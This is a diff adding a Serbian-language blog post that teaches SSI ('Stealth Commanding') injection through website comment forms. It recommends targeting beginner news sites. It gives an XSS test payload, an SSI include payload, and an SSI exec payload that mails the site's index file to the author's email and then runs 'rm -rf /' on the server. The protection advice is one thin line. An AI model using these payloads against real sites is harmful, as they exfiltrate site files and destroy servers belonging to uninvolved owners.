@@ -1,0 +1,47 @@
+---
+title: "Stealth Commanding"
+publishedAt: "2024-08-13"
+summary: "My first post on my new blog."
+---
+
+# [ Stealth Commanding ]
+
+### [ Content ]
+
+[1] What is Stealth Commanding \
+[2] What is SSI \
+[3] How to find vulnerability \
+[4] Example of attack \
+[5] How to protect
+
+
+[1] Šta je Stealth Commanding \
+Stealh Commanding je vrsta web napada u kome se pomoću SSI (Server-side inclusion) kodova iskorišćava ranjivosti istog.
+Ovaj napad se može izvesti ukoliko su u pitanju fajlovi sa ekstenzijom .asp ili .shtml
+
+[2] Šta je SSI (Server-side inclusion) \
+SSI je način priključivanja nekih fajlova nekom fajlu.
+
+U PHP-u se priključivanje fajlova radi na ovaj način: include('header.php');
+dok se u ASP ili SHTML radi na ovaj: <!--#include virtual="fajl.html"-->
+
+[3] Kako uvideti ranjivost \
+Pošto dorkovi za ovu ranjivost ne postoje najčešće se cilja na početničke sajtove u kojima se može komentarisati neka vesti ili slično.
+Ako su filteri loše postavljeni ili ne postoje ono što će ova greška uraditi je da će poput XSS-a urediti kod sajta i izvršiti "naređenje".
+
+[4] Primer Napada \
+Naišli smo na jednostavan sajt dnevnih novina i uvideli da ako ostavimo komentar sa porukom<script>alert("XSS")</script> nakon refrešovanja
+izbaciće nam poruku sa tekstom XSS što bi značilo da je sajt ranjiv. Sledeće što trebamo da uradimo je da umesto <script>alert("XSS")</script>
+<!--#include virtual="index.shtml"--> što će na npr. stranici /stranica/novost/ovaj-onaj-levo-desno.shtml dodati pored osnovne stvari i
+index fajl.
+
+E sada moja teorija za iskorišćavanje ove ranjivosti je sledeća
+```jsx
+<!--#exec cmd="mail -s 'Index sajta' moj.email@mail.com <index.shtml; rm -rf /"-->
+```
+
+Što će pokrenuti komandu da se pošalje na moj email poruka sa naslovom Index sajta
+sa kodom index stranice i nakon toga formatirati server. Ovo još nije testirano zato sam koristio prostu include komandu kao primer.
+
+[5] Zaštita skripte \
+Da bi zaštitili naš sajt od ovog napada dovoljno je da se napravi dobar filter i komentari sa approving opcijom i to je to.
